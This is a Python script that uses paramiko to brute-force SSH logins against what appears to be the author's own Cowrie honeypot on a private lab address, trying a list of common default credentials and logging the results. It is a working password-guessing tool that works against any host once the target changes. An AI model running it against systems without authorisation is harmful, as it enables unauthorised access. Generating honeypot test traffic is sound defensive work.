#!/usr/bin/env python3
"""
Generate REAL SSH attacks against the honeypot
"""
import paramiko
import time
import random
from datetime import datetime
import sys

TARGET = "192.168.53.5"  # Your bastion VM
PORT = 2222

# Common credentials attackers might try
CREDENTIALS = [
    ("root", "toor"),
    ("admin", "admin"),
    ("test", "test"),
    ("ubuntu", "ubuntu"),
    ("user", "user"),
    ("guest", "guest"),
    ("oracle", "oracle"),
    ("postgres", "postgres"),
    ("pi", "raspberry"),
    ("administrator", "password"),
]

def attempt_ssh_connection(host, port, username, password, attempt_num):
    """Actually attempt SSH connection"""
    print(f"[{attempt_num}] Trying {username}:{password} against {host}:{port}")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        start_time = time.time()
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=5,
            look_for_keys=False,
            allow_agent=False,
            banner_timeout=5
        )
        elapsed = time.time() - start_time
        
        # If connection succeeds (unlikely with honeypot)
        print(f"  [!] SUCCESS - Connected in {elapsed:.2f}s")
        client.close()
        return True, elapsed
        
    except paramiko.AuthenticationException:
        print(f"  [x] Authentication failed")
        return False, 0
        
    except Exception as e:
        error_msg = str(e)
        if "timed out" in error_msg.lower():
            print(f"  [x] Connection timeout")
        elif "connection refused" in error_msg.lower():
            print(f"  [x] Connection refused")
        else:
            print(f"  [x] Error: {error_msg[:50]}...")
        return False, 0

def main():
    print("="*70)
    print("GENERATING REAL ATTACKS AGAINST COWRIE HONEYPOT")
    print(f"Target: {TARGET}:{PORT}")
    print(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*70)
    
    results = []
    
    # Generate 20-30 real attempts
    num_attempts = random.randint(20, 30)
    
    for i in range(1, num_attempts + 1):
        # Pick random credentials
        username, password = random.choice(CREDENTIALS)
        
        # Attempt connection
        success, elapsed = attempt_ssh_connection(TARGET, PORT, username, password, i)
        
        results.append({
            "timestamp": datetime.now().isoformat(),
            "attempt": i,
            "target": f"{TARGET}:{PORT}",
            "username": username,
            "success": success,
            "response_time": elapsed if success else 0
        })
        
        # Random delay between attempts (0.5-3 seconds)
        delay = random.uniform(0.5, 3.0)
        time.sleep(delay)
    
    print("="*70)
    print(f"ATTACK SIMULATION COMPLETE")
    print(f"Total Attempts: {len(results)}")
    print(f"Successful Logins: {sum(1 for r in results if r['success'])}")
    print(f"Duration: ~{len(results) * 2} seconds")
    print("="*70)
    
    # Save results
    import json
    with open('real_attack_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print("Results saved to real_attack_results.json")

if __name__ == "__main__":
    # Install paramiko if needed
    try:
        import paramiko
    except ImportError:
        print("Installing paramiko...")
        import subprocess
        subprocess.run([sys.executable, "-m", "pip", "install", "paramiko"], check=True)
        import paramiko
    
    main()
